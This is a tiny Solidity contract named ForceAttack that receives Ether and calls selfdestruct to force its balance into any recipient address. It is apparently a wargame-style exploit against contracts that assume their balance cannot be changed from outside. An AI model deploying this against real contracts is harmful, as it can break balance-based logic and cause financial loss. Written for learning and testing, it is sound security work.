// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    receive() external payable {}

    function sendEth(address payable recipient) external {
        selfdestruct(recipient);
    }
}
